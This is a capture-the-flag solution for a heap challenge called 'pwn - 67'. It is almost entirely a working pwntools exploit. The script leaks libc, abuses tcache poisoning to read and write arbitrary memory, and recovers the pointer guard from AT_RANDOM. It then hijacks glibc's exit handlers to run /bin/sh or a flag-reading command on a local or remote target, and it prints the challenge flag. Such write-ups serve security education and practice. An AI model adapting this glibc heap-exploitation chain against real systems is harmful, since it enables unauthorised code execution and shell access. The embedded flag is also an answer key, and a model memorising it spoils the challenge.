# pwn - 67

Flag:`0xfun{p4cm4n_Syu_br0k3_my_xpl0it_btW}`
```python
import os
from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'info'

ELF_BIN = './chall'
LD      = './ld-linux-x86-64.so.2'
LIBC    = './libc.so.6'

elf  = ELF(ELF_BIN, checksec=False)
libc = ELF(LIBC, checksec=False)

SM  = 0x20
BIG = 0x3f0

MASK_SYM_LEAK_OFF = 0x1e7b20  # stable on this provided libc: main_arena/unsorted leak
EXIT_FUNCS_LISTP_OFF = 0x1e7680  # exit() passes &__exit_funcs here (struct exit_function_list **)


def rol(x, r):
    x &= (1 << 64) - 1
    return ((x << r) & ((1 << 64) - 1)) | (x >> (64 - r))

def ror(x, r):
    x &= (1 << 64) - 1
    return (x >> r) | ((x << (64 - r)) & ((1 << 64) - 1))


def start():
    return process([LD, '--library-path', '.', ELF_BIN], stdin=PIPE, stdout=PIPE, stderr=STDOUT)

def start_io():
    if args.REMOTE:
        host = getattr(args, 'HOST', None) or os.environ.get('HOST') or 'chall.0xfun.org'
        port = int(getattr(args, 'PORT', None) or os.environ.get('PORT') or 65236)
        ssl = bool(getattr(args, 'SSL', False))
        sni = getattr(args, 'SNI', None) or os.environ.get('SNI')
        log.info(f'connecting to {host}:{port} ssl={int(ssl)}')
        if ssl:
            return remote(host, port, ssl=True, sni=sni)
        return remote(host, port)
    return start()

def align_down(x: int, a: int = 0x10) -> int:
    return x & ~(a - 1)


def menu(io, c: int):
    io.recvuntil(b'> ')
    io.sendline(str(c).encode())


def create(io, idx: int, size: int, data: bytes):
    assert 0 < size <= 0x400
    assert 0 <= idx <= 9
    menu(io, 1)
    io.recvuntil(b'Index: ')
    io.sendline(str(idx).encode())
    io.recvuntil(b'Size: ')
    io.sendline(str(size).encode())
    io.recvuntil(b'Data: ')
    io.send(data)
    io.recvuntil(b'Note created!')


def delete(io, idx: int):
    menu(io, 2)
    io.recvuntil(b'Index: ')
    io.sendline(str(idx).encode())
    io.recvuntil(b'Note deleted!')


def edit(io, idx: int, data: bytes):
    menu(io, 4)
    io.recvuntil(b'Index: ')
    io.sendline(str(idx).encode())
    io.recvuntil(b'New Data: ')
    io.send(data)
    io.recvuntil(b'Note updated!')


def readn(io, idx: int, size: int) -> bytes:
    menu(io, 3)
    io.recvuntil(b'Index: ')
    io.sendline(str(idx).encode())
    io.recvuntil(b'Data: ')
    return io.recvn(size)


def setup_leaks(io):
       for i in range(9):
        create(io, i, 0x400, bytes([0x41 + i]) * 0x400)

    for i in range(7):
        delete(io, i)
    delete(io, 7)

    leak = u64(readn(io, 7, 8))
    libc.address = leak - MASK_SYM_LEAK_OFF

    create(io, 0, SM, b'A' * SM)
    delete(io, 0)
    sm_mask = u64(readn(io, 0, 8))
    create(io, 2, SM, b'B' * SM)  # keeper

    create(io, 4, BIG, b'C' * BIG)
    delete(io, 4)
    big_mask = u64(readn(io, 4, 8))
    create(io, 6, BIG, b'D' * BIG)  # keeper

    return leak, sm_mask, big_mask


def tcache20_poison_write(io, sm_mask: int, where: int, payload: bytes, req_size: int):
    assert 1 <= req_size <= SM
    assert len(payload) == req_size
    assert (where & 0xf) == 0  # malloc() returns 0x10-aligned pointers
    delete(io, 2)
    edit(io, 0, p64(where ^ sm_mask) + b'P' * (SM - 8))
    create(io, 2, req_size, b'Q' * req_size)
    create(io, 3, req_size, payload)


def small_poison_read(io, sm_mask: int, where: int) -> bytes:
    # Short-write 1 byte to keep most target bytes intact (read() overwrites only what we send)
    assert (where & 0xf) == 0
    delete(io, 2)
    edit(io, 0, p64(where ^ sm_mask) + b'R' * (SM - 8))
    create(io, 2, SM, b'S' * SM)
    create(io, 3, SM, b'Z')
    return readn(io, 3, SM)

def small_poison_read_no_clobber(io, sm_mask: int, target: int) -> tuple[int, bytes]:
    """
    Like small_poison_read(), but chooses a base address so the 1-byte write at the start of the
    chunk won't overwrite bytes at `target` (useful when you need to read a qword at offset 0).
    Returns (base, blob) where blob is SM bytes starting at base.
    """
        for base in (
        align_down(target - 0x10, 0x10),
        align_down(target, 0x10),
        align_down(target - 0x20, 0x10),
        align_down(target - 0x30, 0x10),
    ):
        off = target - base
        if 1 <= off <= 0x18:
            blob = small_poison_read(io, sm_mask, base)
            return base, blob
    raise RuntimeError('could not choose a non-clobbering base for small read')

def small_peek_qword(io, sm_mask: int, addr: int) -> int:
    base, blob = small_poison_read_no_clobber(io, sm_mask, addr)
    off = addr - base
    if off < 0 or off + 8 > len(blob):
        raise RuntimeError('peek out of range')
    return u64(blob[off:off + 8])


def big_poison_read(io, big_mask: int, where: int) -> bytes:
    assert (where & 0xf) == 0
    delete(io, 6)
    edit(io, 4, p64(where ^ big_mask) + b'T' * (BIG - 8))
    create(io, 6, BIG, b'U' * BIG)
    create(io, 7, BIG, b'Z')
    return readn(io, 7, BIG)

def big_peek_qword(io, big_mask: int, addr: int, pre: int = 0x200) -> int:
    """
    Read a qword from `addr` using BIG poison read so the unavoidable 1-byte clobber happens
    far away from the target (safer when peeking libc globals).
    """
    base = align_down(addr - pre, 0x10)
    dump = big_poison_read(io, big_mask, base)
    off = addr - base
    if off < 0 or off + 8 > len(dump):
        raise RuntimeError('big peek out of range')
    return u64(dump[off:off + 8])

def big_poison_write(io, big_mask: int, where: int, payload: bytes):
    assert (where & 0xf) == 0
    assert len(payload) == BIG
    delete(io, 6)
    edit(io, 4, p64(where ^ big_mask) + b'W' * (BIG - 8))
    create(io, 6, BIG, b'V' * BIG)
    create(io, 7, BIG, payload)


def leak_pointer_guard(io, sm_mask: int, big_mask: int):
    # Remote-safe: leak envp via libc.environ, then parse auxv for AT_RANDOM and read pointer_guard from it.
    env_sym = libc.sym['environ']
    env_base = align_down(env_sym - 0x18, 0x10)
    env_blob = small_poison_read(io, sm_mask, env_base)
    envp_off = env_sym - env_base
    envp = u64(env_blob[envp_off:envp_off + 8])

    at_random = None
    r0 = None
    pointer_guard = None

    # Try a few windows around envp; stack layout varies slightly.
    for delta in (0x18, 0x200, 0x400, 0x800, 0x1000):
        base = align_down(envp - delta, 0x10)
        dump = big_poison_read(io, big_mask, base)
        q = [u64(dump[i:i+8]) for i in range(0, len(dump), 8)]

        env0_off = envp - base
        if env0_off < 0 or env0_off + 8 > BIG:
            continue
        i = env0_off // 8

        # walk envp until NULL
        while i < len(q) and q[i] != 0:
            i += 1
        if i + 2 >= len(q):
            continue

        aux = i + 1
        for j in range(aux, len(q) - 1, 2):
            t = q[j]
            v = q[j + 1]
            if t == 25:  # AT_RANDOM
                at_random = v
                break
            if t == 0:
                break
        if at_random is not None:
            break

    if at_random is None:
        raise RuntimeError('failed to find AT_RANDOM near envp')

    rand_base = align_down(at_random - 0x18, 0x10)
    rand_dump = big_poison_read(io, big_mask, rand_base)
    off = at_random - rand_base
    r0 = u64(rand_dump[off:off + 8])
    pointer_guard = u64(rand_dump[off + 8:off + 16])

    return envp, at_random, r0, pointer_guard


def main():
    io = start_io()

    leak, sm_mask, big_mask = setup_leaks(io)
    log.info(f'libc leak = {hex(leak)}')
    log.info(f'libc base = {hex(libc.address)}')

    envp, at_random, r0, pointer_guard = leak_pointer_guard(io, sm_mask, big_mask)
    log.info(f'envp        = {hex(envp)}')
    log.info(f'AT_RANDOM    = {hex(at_random)}')
    log.info(f'rand0        = {hex(r0)}')
    log.info(f'pointer_guard= {hex(pointer_guard)}')

    want_shell = bool(args.SHELL) or (not args.CMD and not args.TESTPUTS and not args.FLAG)

    if args.TESTPUTS:
        target_fn = libc.sym['puts']
        log.info('TESTPUTS=1: using puts() instead of system()')
    else:
        target_fn = libc.sym['system']
    enc_fn = rol(target_fn ^ pointer_guard, 17)

    exit_listp = libc.address + EXIT_FUNCS_LISTP_OFF
    exit_node = small_peek_qword(io, sm_mask, exit_listp)

    log.info(f'&__exit_funcs @ {hex(exit_listp)}')
    log.info(f'using exit_node @ {hex(exit_node)}')

    if args.VERBOSE:
        try:
            orig_idx = big_peek_qword(io, big_mask, exit_node + 8)
            log.info(f'orig exit_node idx = {orig_idx}')
            if 1 <= orig_idx <= 0x40:
                ent = exit_node + 0x10 + (orig_idx - 1) * 0x20
                orig_flavor = big_peek_qword(io, big_mask, ent)
                orig_fn_enc = big_peek_qword(io, big_mask, ent + 8)
                orig_fn = ror(orig_fn_enc, 17) ^ pointer_guard
                log.info(f'orig last entry flavor={orig_flavor} fn_enc={hex(orig_fn_enc)} fn_dem={hex(orig_fn)}')
        except Exception as e:
            log.warning(f'debug read of exit_node failed: {e!r}')

    cmd_addr = align_down(exit_node + 0x200, 0x10)
    if args.TESTPUTS:
        cmd = b'PWNED_FROM_EXIT_HANDLER\x00'
    elif args.CMD:
        cmd = str(args.CMD).encode() + b'\x00'
    elif args.FLAG:
        cmd = b'cat flag||cat ./flag||cat /flag' + b'\x00'
        assert len(cmd) == SM
    elif want_shell:
        # Keep it simple for pipe-based interaction: no prompt required, but it should accept commands.
        cmd = b'/bin/sh\x00'
    else:
        # Backward compatible default if someone explicitly disables shell.
        cmd = b'cat flag||cat ./flag||cat /flag' + b'\x00'
        assert len(cmd) == SM

    if len(cmd) <= SM:
        tcache20_poison_write(io, sm_mask, cmd_addr, cmd.ljust(SM, b'\x00'), SM)
    else:
        blob = cmd if cmd.endswith(b'\x00') else (cmd + b'\x00')
        big_poison_write(io, big_mask, cmd_addr, blob[:BIG].ljust(BIG, b'\x00'))

    tcache20_poison_write(io, sm_mask, exit_node, p64(0) + p64(1), 0x10)  # next=0, idx=1
    tcache20_poison_write(
        io,
        sm_mask,
        exit_node + 0x10,
        p64(4) + p64(enc_fn) + p64(cmd_addr) + p64(0),
        0x20,
    )

    if args.VERBOSE:
        try:
            new_next = big_peek_qword(io, big_mask, exit_node + 0)
            new_idx = big_peek_qword(io, big_mask, exit_node + 8)
            new_flavor = big_peek_qword(io, big_mask, exit_node + 0x10)
            new_fn_enc = big_peek_qword(io, big_mask, exit_node + 0x18)
            new_arg = big_peek_qword(io, big_mask, exit_node + 0x20)
            new_fn = ror(new_fn_enc, 17) ^ pointer_guard
            log.info(f'patched exit_node: next={hex(new_next)} idx={new_idx}')
            log.info(f'patched entry0: flavor={new_flavor} fn_enc={hex(new_fn_enc)} fn_dem={hex(new_fn)} arg={hex(new_arg)}')
            log.info(f'target_fn @ {hex(target_fn)} cmd_addr @ {hex(cmd_addr)}')
        except Exception as e:
            log.warning(f'debug verify readback failed: {e!r}')


    menu(io, 5)

    if want_shell:
        io.interactive()
        return
    try:
        out = io.recvall(timeout=8.0)
    except Exception:
        out = b''
    print(out.decode(errors='replace'))


if __name__ == '__main__':

    main()
```
Solved by: ha1qal
